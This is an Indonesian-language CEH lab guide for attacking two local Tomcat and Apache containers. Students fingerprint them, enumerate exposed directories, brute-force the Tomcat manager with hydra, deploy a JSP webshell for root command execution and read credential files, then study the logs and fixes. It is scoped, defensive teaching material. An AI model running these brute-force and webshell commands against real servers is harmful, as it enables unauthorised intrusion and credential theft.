# Lab 02 - Hacking web server

Modul CEH 13 - Hacking Web Servers | 75 menit | Level 2

## Tujuan

Anda mengambil alih sebuah server web sampai bisa menjalankan perintah sistem
di dalamnya, tanpa menyentuh satu pun bug di kode aplikasi. Seluruh jalannya
memakai fitur bawaan server dan setelan yang salah, yaitu persis materi yang
diuji di Modul 13 CEH, dan bukan Modul 14 yang membahas aplikasi web.

### Bedanya dengan Modul 14, baca ini dulu

Dua modul ini paling sering tertukar di ujian, karena keduanya berbicara soal
HTTP dan keduanya berakhir dengan penyerang menguasai sesuatu. Bedanya ada di
apa yang rusak.

| | Modul 13, web server | Modul 14, aplikasi web |
|---|---|---|
| Yang diserang | perangkat lunak server dan setelannya | kode yang ditulis pengembang |
| Contoh temuan | panel manager terbuka, daftar isi direktori menyala, berkas cadangan terlayani, versi diumumkan | SQL injection, XSS, IDOR, otentikasi yang bisa dilewati |
| Yang memperbaiki | administrator sistem, lewat berkas konfigurasi | pengembang, lewat perubahan kode |
| Perkakas khas di soal | nmap, nikto, dirb, gobuster, hydra | Burp Suite, sqlmap, ZAP |
| Hasil akhir di lab ini | webshell dari fitur unggah aplikasi | mengambil data lewat celah di kode |

Patokan yang bisa Anda pakai di ruang ujian: kalau perbaikannya dilakukan
dengan mengubah berkas konfigurasi atau mengganti sandi, itu Modul 13. Kalau
perbaikannya harus dengan mengubah kode program, itu Modul 14. Lab hari ini
seluruhnya Modul 13. Aplikasi web yang rapuh dilatih di lab terpisah.

## Waktu

75 menit. Langkah 1 sampai 7 sekitar 55 menit, sisanya untuk pertanyaan dan
tantangan tambahan.

## Peringatan dan batas

Baca bagian ini sampai habis sebelum mengetik perintah apa pun.

1. **Target yang sah di lab ini cuma dua container**, yaitu `httpd` dan
   `tomcat` di dalam compose lab ini. Tidak ada target lain yang sah, di lab
   ini maupun di lab mana pun sepanjang minggu ini.
2. **Jangan menyalin perintah lab ini ke terminal laptop Anda sendiri.**
   Semua perintah penyerangan dijalankan dari dalam toolbox, yang jaringannya
   sudah dikurung. Perintah yang sama, diketik di terminal laptop, menyerang
   jaringan kantor Course-Net.
3. **Webshell yang Anda pasang di Langkah 5 memberikan hak root** di dalam
   container Tomcat. Itu memang tujuannya. Jangan pernah memasang berkas
   seperti itu di server yang bukan milik Anda, dan jangan menyimpannya di
   folder yang ikut ter-upload ke tempat lain.
4. **Port lab ini diikat ke 127.0.0.1**, jadi peserta lain di ruangan tidak
   bisa membuka target Anda, dan Anda tidak bisa membuka target mereka.
   Kalau ada yang mengajak saling menyerang antar laptop, jawabannya tidak.
5. Berkas `config.php.bak` dan seluruh isi situs contoh di lab ini fiktif.
   Tidak ada kredensial nyata, nama orang, atau data siapa pun di dalamnya.

## Cara menyalakan

```
./lab up 02
```

Di Windows, ganti `./lab` dengan `.\lab.cmd` pada semua perintah di halaman
ini.

Dua target ini akan hidup:

| Container | Peran | Dari browser laptop | Dari dalam toolbox |
|---|---|---|---|
| `tomcat` | Apache Tomcat 9, panel manager terbuka | http://localhost:8200 | `tomcat` port 8080 |
| `httpd` | Apache httpd 2.4, salah konfigurasi | http://localhost:8201 | `httpd` port 80 |

Terminal penyerang:

```
./lab sh 02
```

Semua perintah di Langkah 2 sampai 6 diketik di dalam terminal itu.

Perhatikan bahwa dari dalam toolbox targetnya dipanggil `tomcat` dan `httpd`,
bukan `localhost`. Setiap container punya localhost sendiri.

## Langkah wajib

### Langkah 1. Pastikan dua targetnya hidup

Dari laptop Anda, di terminal biasa, bukan di dalam toolbox:

```
curl -s -o /dev/null -w "%{http_code}\n" http://localhost:8200/
curl -s -o /dev/null -w "%{http_code}\n" http://localhost:8201/
```

Yang harus terlihat: dua-duanya menjawab `200`.

Lalu buka http://localhost:8200/manager/html di browser. Yang muncul adalah
kotak minta nama pengguna dan sandi. Jangan diisi dulu, tutup saja kotaknya.
Kotak itu sendiri sudah temuan: panel administrasi Tomcat terbuka untuk siapa
pun yang bisa menjangkau port ini.

Kalau halaman tidak terbuka, tunggu 20 detik lalu muat ulang. Tomcat butuh
beberapa detik untuk selesai menyalakan aplikasinya. Masih gagal, jalankan
`./lab reset 02`.

### Langkah 2. Sidik jari server

Masuk ke toolbox dengan `./lab sh 02`, lalu:

```
nmap -sV -Pn -p 80,8080 httpd tomcat
```

Yang harus terlihat, dua baris ini:

```
80/tcp   open   http       Apache httpd 2.4.68 ((Unix))
8080/tcp open   http       Apache Tomcat 9.0.120
```

Angka versinya bisa berbeda sedikit di laptop Anda kalau image-nya lebih baru.
Yang penting nama produk dan versinya terbaca, bukan sekadar kata `http`.

Sekarang lihat dari mana nmap tahu, dan lihat bedanya dua server ini:

```
curl -sI http://httpd/
curl -sI http://tomcat:8080/
```

Pada `httpd` akan muncul tiga baris yang membocorkan banyak hal:

```
Server: Apache/2.4.68 (Unix)
X-Powered-By: PHP/5.6.40
X-Backend-Server: web01.lab.internal
```

Pada `tomcat`, header `Server` tidak ada sama sekali. Tomcat memang tidak
mengirimnya secara bawaan. Tapi coba minta halaman yang tidak ada:

```
curl -s http://tomcat:8080/tidakada | grep -o "Apache Tomcat/[0-9.]*"
```

Keluarannya `Apache Tomcat/9.0.120`. Halaman errornya yang bicara.

Catat pelajaran ini, karena sering jadi soal: **menyembunyikan header Server
bukan berarti versinya tidak ketahuan.** Halaman error bawaan, urutan header,
dan perilaku protokol tetap bisa dipakai untuk menebak produk dan versinya.
Itu sebabnya membuang banner disebut mempersulit, bukan mengamankan.

Terakhir, lihat tanda tangan server di halaman error `httpd`:

```
curl -s http://httpd/tidakada | tail -3
```

Muncul baris `Apache/2.4.68 (Unix) Server at httpd Port 80`. Itu efek
`ServerSignature On`. Setelan yang benar adalah `ServerTokens Prod` dan
`ServerSignature Off`.

### Langkah 3. Enumerasi httpd, cari yang tidak seharusnya terbuka

Mulai dari berkas yang justru memberi petunjuk:

```
curl -s http://httpd/robots.txt
```

Isinya menyebut `/backup/`, `/server-status`, dan `/arsip-lama/`. Berkas
`robots.txt` bukan pengaman. Isinya daftar tempat yang menurut pemiliknya
tidak boleh dilihat orang, dan itu tempat pertama yang dibuka penyerang.

Sekarang tebak direktori secara sistematis:

```
gobuster dir -u http://httpd/ -w /lab/wordlists/dir.txt -t 10
```

Yang harus terlihat:

```
backup               (Status: 301) [Size: 337] [--> http://httpd/backup/]
server-status        (Status: 200) [Size: 10710]
```

Angka pada `Size` untuk `server-status` akan berbeda tiap kali, karena isinya
memang berubah mengikuti keadaan server saat itu.

Buka daftar isi direktorinya:

```
curl -s http://httpd/backup/
```

Muncul halaman `Index of /backup` berisi dua berkas. Ini efek
`Options +Indexes` pada direktori yang tidak punya `index.html`. Server sedang
mendaftarkan seluruh isinya untuk siapa saja.

Ambil berkas cadangannya:

```
curl -s http://httpd/backup/config.php.bak
```

Berkas berakhiran `.bak` tidak dijalankan sebagai program, jadi seluruh isinya
terkirim apa adanya sebagai teks. Di dalamnya ada catatan tim yang menyebut
akun panel Tomcat masih bernama `tomcat` dan sandinya belum diganti dari
daftar bawaan. Itu bahan untuk Langkah 4.

Terakhir, halaman status server:

```
curl -s http://httpd/server-status | grep -iE "server version|current time|requests currently"
```

`mod_status` membocorkan versi, waktu hidup server, dan daftar permintaan yang
sedang diproses lengkap dengan alamat IP kliennya.

Kalau masih ada waktu, jalankan pemindai otomatis dan bandingkan hasilnya
dengan yang sudah Anda temukan sendiri:

```
nikto -h http://httpd/ -maxtime 60 -ask no
```

Opsi `-ask no` wajib, kalau tidak nikto akan berhenti menunggu jawaban di
akhir pemindaian. Opsi `-maxtime 60` memotong pemindaian supaya kelas tidak
menunggu terlalu lama.

### Langkah 4. Tebak sandi panel manager dengan hydra

Panel manager Tomcat memakai HTTP Basic authentication. Modul hydra yang
cocok untuk itu adalah `http-get`.

```
hydra -l tomcat -P /lab/wordlists/pass.txt -s 8080 -f tomcat http-get /manager/html
```

Arti tiap bagian:

| Bagian | Artinya |
|---|---|
| `-l tomcat` | satu nama pengguna saja, yang tadi ditemukan di berkas cadangan |
| `-P /lab/wordlists/pass.txt` | daftar sandi yang dicoba |
| `-s 8080` | port targetnya, karena bukan 80 |
| `-f` | berhenti begitu satu pasangan ketemu |
| `tomcat` | nama host targetnya |
| `http-get /manager/html` | modul dan jalur yang diserang |

Yang harus terlihat:

```
[8080][http-get] host: tomcat   misc: /manager/html   login: tomcat   password: s3cret
1 of 1 target successfully completed, 1 valid password found
```

Kalau Anda belum menemukan nama penggunanya di Langkah 3, jalankan versi yang
menebak nama pengguna sekaligus. Perhatikan bahwa jumlah percobaannya menjadi
jauh lebih banyak:

```
hydra -L /lab/wordlists/user.txt -P /lab/wordlists/pass.txt -s 8080 -f tomcat http-get /manager/html
```

Sekarang buka http://localhost:8200/manager/html di browser dan masuk dengan
pasangan yang ketemu. Anda melihat daftar aplikasi yang terpasang, dan di
bagian bawah halaman ada formulir unggah berkas WAR.

### Langkah 5. Pasang webshell lewat fitur unggah aplikasi

Yang akan Anda pakai bukan celah keamanan. Mengunggah aplikasi memang fitur
resmi Tomcat Manager. Yang salah adalah siapa yang boleh memakainya.

Berkas JSP-nya sudah disediakan di folder lab, dan ikut terlihat dari dalam
toolbox di `/lab/webshell/index.jsp`. Bacalah dulu isinya, panjangnya cuma
belasan baris.

Berkas WAR itu sebenarnya berkas ZIP biasa. Bungkus JSP tadi:

```
cd /lab/webshell
python3 -c 'import zipfile; z=zipfile.ZipFile("/tmp/shell.war","w"); z.write("index.jsp"); z.close()'
unzip -l /tmp/shell.war
```

Unggah lewat antarmuka teks milik manager. Antarmuka ini butuh peran
`manager-script`, dan akun `tomcat` di lab ini kebetulan memegangnya:

```
curl -u tomcat:s3cret -T /tmp/shell.war "http://tomcat:8080/manager/text/deploy?path=/shell&update=true"
```

Yang harus terlihat:

```
OK - Deployed application at context path [/shell]
```

Jalankan perintah lewat webshell:

```
curl "http://tomcat:8080/shell/index.jsp?cmd=id"
curl "http://tomcat:8080/shell/index.jsp?cmd=uname%20-a"
```

Yang harus terlihat pada perintah pertama:

```
uid=0(root) gid=0(root) groups=0(root)
```

Anda menjalankan perintah sebagai root di dalam container Tomcat, dan tidak
satu pun baris kode aplikasi yang dieksploitasi. Ambil berkas kredensialnya
sekalian, supaya terlihat apa yang bisa dibaca dari posisi ini:

```
curl "http://tomcat:8080/shell/index.jsp?cmd=cat%20/usr/local/tomcat/conf/tomcat-users.xml" | grep username
```

Webshell yang sama juga bisa dibuka dari browser laptop Anda di
http://localhost:8200/shell/index.jsp?cmd=id

### Langkah 6. Baca log, lihat jejak yang Anda tinggalkan

Dua target menulis lognya ke folder `jejak/` di folder lab, dan folder itu
ikut terlihat dari dalam toolbox di `/lab/jejak`. Jadi Anda bisa membacanya
dengan perintah biasa.

```
ls /lab/jejak
```

Mulai dari sisi Tomcat, tempat hydra bekerja:

```
grep -c " 401 " /lab/jejak/localhost_access_log.*.txt
```

Angkanya mendekati jumlah tebakan hydra yang gagal, tapi biasanya tidak persis
sama. Perbedaannya bisa Anda telusuri sendiri dengan memisahkan berdasarkan
alamat asal, dan itu bahan Pertanyaan nomor 4:

```
grep " 401 " /lab/jejak/localhost_access_log.*.txt | awk '{print $1}' | sort | uniq -c
```

Sekarang lihat momen sandinya ketebak:

```
grep "/manager/" /lab/jejak/localhost_access_log.*.txt | tail -5
```

Yang harus terlihat: sederet baris `401`, lalu satu baris `200` yang kolom
ketiganya berubah dari `-` menjadi `tomcat`. Kolom itu adalah nama pengguna
yang berhasil masuk. Setelah itu muncul baris `PUT /manager/text/deploy`, yaitu
saat webshell diunggah.

```
grep -E "deploy|/shell/" /lab/jejak/localhost_access_log.*.txt
```

Seluruh rangkaian serangan Anda terekam berurutan dan lengkap dengan waktunya.
Inilah yang dibaca tim respons insiden.

Sekarang sisi Apache:

```
awk '{print $9}' /lab/jejak/akses-httpd.log | sort | uniq -c | sort -rn
```

Kolom ke-9 adalah kode status. Setelah `gobuster` dan `nikto`, jumlah `404`
akan jauh lebih besar daripada jumlah `200`. Perbandingan itu sendiri sudah
tanda pemindaian, karena pengunjung biasa tidak meminta puluhan alamat yang
tidak ada dalam hitungan detik.

Terakhir, lihat kolom User-Agent:

```
awk -F'"' '{print $6}' /lab/jejak/akses-httpd.log | sort | uniq -c | sort -rn | head -5
```

Sebagian perkakas mengumumkan namanya sendiri. Yang muncul di lab ini antara
lain `gobuster/3.8.2`, `curl/8.20.0`, dan `Mozilla/5.0 (compatible; Nmap
Scripting Engine; https://nmap.org/book/nse.html)`. Sekali membaca kolom ini,
pembela sudah tahu perkakas apa yang dipakai.

Tapi jangan berhenti di situ. Kalau Anda menjalankan nikto tadi, ulangi
perintah ini dan perhatikan bahwa ratusan permintaannya justru datang dengan
nama peramban biasa seperti Chrome dan Safari. Nikto versi 2.6 mengacak
User-Agent-nya. Pelajarannya untuk sisi bertahan: **mendeteksi pemindai dari
User-Agent saja tidak bisa diandalkan, karena kolom itu diisi oleh penyerang.**
Yang jauh lebih sulit dipalsukan adalah pola perilakunya, yaitu kecepatan,
jumlah permintaan, dan rasio kode status yang baru saja Anda hitung.

### Langkah 7. Cabut webshellnya

Sebelum lab dimatikan, buang aplikasi yang Anda pasang:

```
curl -u tomcat:s3cret "http://tomcat:8080/manager/text/undeploy?path=/shell"
curl -u tomcat:s3cret "http://tomcat:8080/manager/text/list"
```

Yang harus terlihat: `OK - Undeployed application at context path [/shell]`,
dan `/shell` hilang dari daftar.

Ini bukan sekadar beberes. Membersihkan artefak yang dipasang saat pengujian
adalah bagian dari aturan main pentest yang sah, dan pertanyaan soal tahap
`Clearing Tracks` serta tanggung jawab penguji muncul di ujian.

## Pertanyaan

Jawablah dari hasil kerja Anda sendiri, bukan dari ingatan.

1. Berapa versi persis Apache httpd dan Apache Tomcat di lab Anda, dan dari
   baris keluaran mana masing-masing Anda dapatkan?
2. Header `Server` tidak muncul pada Tomcat. Lalu dari mana nmap tahu itu
   Tomcat 9? Sebutkan satu cara lain yang Anda buktikan sendiri di Langkah 2.
3. Dua setelan Apache mana yang membuat isi folder `/backup` bisa didaftar dan
   berkas `.bak`-nya bisa diunduh? Tulis nama direktifnya, dan tulis juga
   bentuk yang benar.
4. Berapa jumlah baris `401` di log akses Tomcat setelah hydra Anda jalankan,
   dan berapa jumlah tebakan yang dilaporkan hydra sendiri? Kalau kedua angka
   itu berbeda, apa penjelasannya?
5. Peran apa yang wajib dimiliki akun Tomcat supaya `manager/text/deploy` bisa
   dipakai, dan peran apa yang cukup kalau hanya ingin membuka panelnya lewat
   browser?
6. Di baris log mana persis terlihat bahwa sandinya berhasil ditebak? Sebutkan
   kolom yang berubah, bukan cuma nomor barisnya.
7. Semua yang Anda kerjakan hari ini adalah Modul 13. Sebutkan satu langkah
   dari lab ini yang akan berubah kategori menjadi Modul 14 seandainya
   penyebabnya adalah kode aplikasi, dan jelaskan kenapa.

## Tantangan tambahan

Untuk yang sudah selesai lebih cepat. Tidak wajib, dan urutannya bebas.

1. **Tanpa hydra.** Tebak sandinya memakai `curl` dan perulangan shell saja.
   Petunjuk: `for p in $(cat /lab/wordlists/pass.txt); do ...; done` dengan
   `curl -s -o /dev/null -w "%{http_code}"` dan opsi `-u tomcat:$p`. Ini
   melatih Anda membaca apa yang sebenarnya dikerjakan hydra.
2. **Metode HTTP.** Jalankan `curl -X OPTIONS -i http://httpd/` dan lihat
   daftar metode yang diizinkan. Salah satunya adalah `TRACE`. Cari tahu apa
   itu Cross Site Tracing, dan direktif Apache mana yang mematikannya.
3. **Kembalikan pagar Tomcat.** Panel manager di lab ini bisa dibuka dari
   jaringan karena `META-INF/context.xml` miliknya diganti. Baca berkas
   `compose.yaml` lab ini, temukan barisnya, lalu cari tahu nama valve bawaan
   Tomcat yang membatasi akses berdasarkan alamat IP.
4. **Perbaiki Apache-nya.** Salin `httpd/httpd-lab.conf` ke berkas baru, ubah
   sampai semua temuan Langkah 3 hilang, lalu jalankan ulang nikto untuk
   membuktikannya. Blok yang benar sudah ditulis sebagai komentar di dalam
   berkas itu, jadi tugas Anda menyalakannya, bukan mengarangnya.
5. **Webshell yang lebih sopan.** Ubah `webshell/index.jsp` supaya hanya
   menerima perintah dari daftar yang Anda tentukan sendiri, lalu bungkus dan
   unggah ulang dengan `update=true`. Ini melatih Anda melihat webshell sebagai
   program biasa, bukan mantra.
6. **Cari sendiri di log.** Tanpa melihat catatan Anda, rekonstruksi urutan
   serangan hanya dari `/lab/jejak`. Tulis lima baris ringkasan seperti laporan
   insiden: kapan mulai, dari alamat mana, apa yang dicoba, kapan berhasil,
   apa yang dipasang.

## Yang tidak bisa dikerjakan di lab ini

Bagian ini sama pentingnya dengan langkah-langkah di atas. Lab yang berpura
pura lengkap membuat Anda salah mengira sudah menguasai sesuatu.

**Kunci akun bawaan Tomcat sengaja dimatikan.** Tomcat asli membungkus realm
kredensialnya dengan `LockOutRealm`, yang mengunci sebuah akun setelah 5
kegagalan dan menolak sandi yang benar sekalipun selama 300 detik berikutnya.
Diukur pada 2026-08-06 di mesin penyusun lab ini, hydra dengan 52 tebakan
menabrak kunci itu pada tebakan keenam dan melaporkan `0 valid password found`
walaupun sandi yang benar ada di dalam daftarnya, sementara log Tomcat mencatat
`An attempt was made to authenticate the locked user [tomcat]`. Supaya Langkah
4 bisa selesai di kelas, `compose.yaml` lab ini menggantinya dengan
`CombinedRealm`, yaitu kelas induknya yang tidak mengunci.

Konsekuensinya untuk ujian dan untuk pekerjaan nyata: **kunci akun adalah
countermeasure resmi terhadap brute force, dan di server sungguhan Anda akan
menabraknya.** Serangan yang berhasil di dunia nyata biasanya bukan hydra
dengan tiga belas sandi, melainkan satu sandi yang sama dicoba ke banyak akun
sekaligus, yang disebut password spraying, justru supaya hitungan kegagalan
per akun tetap di bawah ambang kunci.

**Tidak ada HTTPS di lab ini.** Semua lalu lintas polos, jadi topik sertifikat
kedaluwarsa, cipher lemah, dan Heartbleed tidak bisa dilatih di sini.
Pertanyaan soal itu tetap muncul di ujian, dan jawabannya perlu Anda hafal
dari materi.

**Tidak ada penyeimbang beban, WAF, atau reverse proxy.** Di lingkungan nyata,
permintaan Anda hampir selalu melewati sesuatu sebelum sampai ke server. Itu
mengubah header yang Anda lihat, menyembunyikan alamat asli server, dan sering
memblokir pemindai jauh sebelum nikto selesai. Di lab ini Anda berbicara
langsung dengan servernya.

**Alamat IP di log lab ini bukan alamat penyerang yang sebenarnya.** Yang
tercatat adalah alamat container. Di dunia nyata alamat itu sering berupa
alamat proxy atau NAT, dan menentukan siapa yang sebenarnya mengetuk butuh
korelasi dengan sumber log lain.

**Container ini bukan server sungguhan.** Anda mendapat root di dalam sebuah
container yang isinya cuma Tomcat. Tidak ada pengguna lain, tidak ada layanan
tetangga, tidak ada domain. Di server nyata, root di satu layanan adalah awal
dari tahap berikutnya, bukan akhir cerita.

**Yang tidak berubah dari dunia nyata:** empat setelan salah di lab ini, yaitu
panel administrasi yang terbuka ke jaringan, kredensial bawaan yang tidak
diganti, daftar isi direktori yang menyala, dan berkas cadangan yang
tertinggal di document root, adalah temuan yang benar-benar berulang di
pengujian sungguhan. Yang disederhanakan adalah lingkungannya, bukan
kesalahannya.

## Membereskan

```
./lab down 02
```

Log yang lahir selama lab tersimpan di folder `labs/02-web-server/jejak/`.
Berkas itu diabaikan git, jadi tidak akan ikut terkirim ke mana pun, tapi
boleh Anda hapus sendiri kalau tidak diperlukan lagi:

```
rm -f labs/02-web-server/jejak/*.log labs/02-web-server/jejak/*.txt
```

Kalau lab ini perlu dikembalikan ke keadaan awal, termasuk membuang webshell
yang terpasang:

```
./lab reset 02
```
